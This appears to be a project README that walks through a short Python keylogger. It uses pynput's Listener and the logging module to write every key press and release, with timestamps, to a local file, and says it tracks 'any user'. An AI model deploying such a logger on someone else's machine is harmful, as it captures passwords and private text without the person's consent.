# Keyboard-Activity-Log-Generator
<h2>Python Program to keep a track of keyboard activity of any user using Python pynput and logging modules.</h2><hr>
<p>
  <b>Modules used:</b> logging & pynput
</p><p>
  To know more about them and their installation visit <a href="https://pypi.org/">this</a> link and search about them to get the required information.
</p><hr><p>The following steps are involved while making the code:-</p><ol>
  <li><p>IMPORTING THE PACKAGES
    <p align="center">from  pynput.keyboard import Listener
      import logging</p>
In the above snippet Listener is a class from the pynput.keyboard package thst is used to recognize (listen) to various hardware activities like key press, key release, scroll, click etc.
The logging package is imported to create the log file to keep a track of the keyboard activity of the user.</p></li>
<li><p>PROVIDING THE FILE PATH
 <p align="center">file_path="key_log.txt"<p>
Personally, I have a folder dedicated for each of my projects so I decided to create a file named key_log.txt in the same directory. You may opt to do the same or you can create a file anywhere in your system and just provide the file path (if it is in some foreign directory) or file name (if it is in the same directory as of the code) as the case may be.</p></li><li><p>DECLARING FUNCTIONS FOR ACTIVITY OR ACTIVITIES
Keyboard activity mainly comprises of the following two events:-
  <ul><li><p><b>Key Press</b> - Action when a finger is placed on the key to type. So lets declare what to do when this event occurs as follows:-
    <p align="center">def on_press(key):  #Function for key press action
      logging.info("Key pressed : {0}".format(key)) </p>   
Here, key is the key pressed and logging.info() is the function which writes (logs or creates a log) to our desired file with logging level = INFO in the specified format. </p>
</li><li><<b>
Key Release</b> - Just after performing the above action, when the finger is removed from the key that action is called key release. Hera also lets declare what to do when this action occurs:-
<p align="center">
def on_release(key):    #function for key release action
    logging.info("Key released: {0}".format(key))</p></li></ul>
<li><p>WRITING THE DRIVER CODE<p align="center">
logging.basicConfig(filename=file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')  #Configuring log file 
with Listener(on_press=on_press, on_release=on_release) as l:   #whenever key is pressed or released
  l.join()    #both the process functions are executed</p>
Here, logging.basicConfig(filename, level, format) is used to configure the logger. Here filename is the filename or filepath that you have decided to keep the log into, level specifies the message level of the logs by default and format is the format in which the log will be updated. The one used here i.e. '%(asctime)s: %(message)s' is for time stamp as well as message.  </p></li></ol><hr>
<p>
Then we are setting up the listener by creating an instance in a with statement with link to the methods that we declared above and finally using it's .join() method to join it to the main thread.</p>
